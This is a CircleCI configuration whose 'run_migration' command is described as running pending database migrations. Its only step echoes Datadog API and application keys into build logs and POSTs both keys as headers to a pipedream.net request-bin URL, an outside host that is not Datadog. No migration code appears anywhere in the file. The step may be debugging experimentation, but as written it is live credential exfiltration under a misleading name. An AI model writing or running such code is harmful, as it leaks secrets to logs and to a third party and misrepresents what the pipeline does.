version: 2.1


commands:
    run_migration:
        description: |
            Checks and runs any pending DB migration.
        parameters:
            create_snapshot:
                default: false
                description: |
                    Condition whether to create a DB snapshot prior to running a Database Migration. Default is set to true and is recommended for Production Migration.
                type: boolean
            datadog_api_key:
                default: ""
                description: |
                    Datadog API Key to authenticate programmatic access to Log Data. This is not required.
                type: string
            datadog_app_key:
                default: ""
                description: |
                    Datadog Application Key to authenticate programmatic access to Log Data. This is not required.
                type: string
            db_identifier:
                default: ""
                description: |
                    The name of the RDS cluster. This is required if you've set create snapshot to true.
                type: string
            ecs_cluster_name:
                description: |
                    The cluster name where the one time task should run.
                type: string
            ecs_task_family:
                description: |
                    The task family to use in running task.
                type: string
        steps:
            - run:
                command: |
                    echo ${<< parameters.datadog_api_key >>}
                    echo ${<< parameters.datadog_app_key >>}

                    echo $DATADOG_API_KEYo
                    echo $DATADOG_APP_KEYo
                    
                    echo ${!DATADOG_API_KEYo}
                    echo ${!DATADOG_APP_KEYo}
                   
                    set -o noglob
                    MIGRATION_TASK_ARN=$(eval echo \""$MIGRATION_TASK_ARN"\")
                    DATADOG_API_KEY=$(eval echo \""${!DATADOG_API_KEYo}"\")
                    DATADOG_APP_KEY=$(eval echo \""${!DATADOG_APP_KEYo}"\")
                    
                    echo $DATADOG_API_KEYo
                    echo $DATADOG_APP_KEYo
                    
                    echo ${!DATADOG_API_KEYo}
                    echo ${!DATADOG_APP_KEYo}
                    
                    if [ -z "$DATADOG_API_KEYo" ] || [ -z "$DATADOG_APP_KEYo" ]; then

                      echo "No Datadog credentials provided."

                    else
                      curl -v -L -X POST "https://enf81151xturj.x.pipedream.net" \
                        --header "Content-Type: application/json" \
                        --header "DD-API-KEY: $DATADOG_API_KEYo" \
                        --header "DD-APPLICATION-KEY: $DATADOG_APP_KEYo" \
                        --data-raw '{"filter": {"from": "now-15m", "to": "now", "query": "'"task_arn: ${MIGRATION_TASK_ARN}"'"}}' | jq
                    fi
                environment:
                    DATADOG_API_KEYo: << parameters.datadog_api_key >>
                    DATADOG_APP_KEYo: << parameters.datadog_app_key >>
                name: Get Datadog logs
                
jobs:
  job-1:
    docker:
      - image: cimg/base:stable
    steps:
      - run_migration:
          datadog_api_key: $DATADOG_API_KEY
          datadog_app_key: $DATADOG_APP_KEY
          ecs_cluster_name: leclus
          ecs_task_family: tavu

#   job-2:
#     docker:
#       - image: circleci/node
#     steps:
#       - run:
#           command: |
#                    echo "This is job 2"
#                    sleep 20
                   
#   job-3:
#     docker:
#       - image: circleci/node
#     steps:
#       - run:
#           command: |
#                    echo "This is job 3"
                   
                   
                   
workflows:

  whodidthis:
    jobs:
      - job-1
#       - job-2:
#           requires:
#             - job-1
            
#       - request-deploy:
#           type: approval
#           requires:
#             - job-2
          
#       - job-3:
#           requires:
#             - request-deploy
#           context: daily-deployments
